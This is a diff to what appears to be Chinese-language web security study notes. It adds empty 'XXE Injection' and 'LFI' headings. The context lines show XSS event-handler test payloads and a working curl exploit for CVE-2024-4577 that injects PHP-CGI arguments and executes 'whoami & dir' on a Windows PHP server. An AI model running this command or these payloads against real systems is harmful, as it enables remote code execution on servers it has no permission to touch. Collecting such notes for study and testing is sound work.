@@ -165,6 +165,7 @@
       <div onpointerout="alert(45)">MOVE HERE</div>
       <div onpointerup="alert(45)">MOVE HERE</div>
      ```
+  ### XXE Injection
   ## CVE 2024-4577
   - 此弱點影響安裝於 Windows 作業系統上所有的 PHP 版本
     - PHP 8.3 < 8.3.8
@@ -176,5 +177,7 @@
     ```sh
     curl -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
     ```
+## LFI
+
 ## RF&一堆教材文件
  - https://github.com/swisskyrepo/PayloadsAllTheThings
